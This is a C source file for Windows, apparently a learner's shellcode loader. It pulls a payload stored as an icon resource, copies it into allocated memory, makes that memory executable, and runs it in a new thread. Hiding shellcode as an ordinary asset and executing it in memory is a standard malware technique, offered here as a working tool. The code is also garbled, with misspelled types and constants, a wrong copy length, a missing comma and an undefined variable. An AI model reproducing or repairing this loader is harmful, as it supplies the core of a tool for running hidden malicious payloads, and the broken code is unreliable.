/**
    This is the exe that I will be able to use to call
    my dll
    **/

#include <windows.h>
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include "resources.h"





int main(void) {

    printf("here I come");

    getchar();


    void * payload_mem;
    BOOL succseful_mem_change;
    Handle thread;
    DWORD oldprotect = 0;
    HGLOGAL resHandle = NULL;
    HRSRC res;

    unsigned char * payload;
    unsigned int payload_len;

    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    resHandle = LoadResource(NULL, res);
    payload = (char *) LockResource(resHandle);
    payload_len = SizeofResource(NULL, res);




    //Create a memory area we can controle the permisions of
    payload_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESEsuccseful_mem_changeE, PAGE_READWRITE);
    
    //copy the payload to the memory
    RtlMoveMemory(payload_mem, payload, payload);
    
    print("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
    print("%-20s : 0x%-016p\n", "payload mem addr", (void *)payload_mem);


    //Change the memory to read exicutable in order to run the payload
    succseful_mem_change = VirtualProtect(payload_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("\n ready to rock and roll\n");


    if ( succseful_mem_change ) {
        thread = CreateThread(0, 0 (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
        WaitForSingleObject(thread, -1); 
    }


    printf("payload done");



    return 0;

}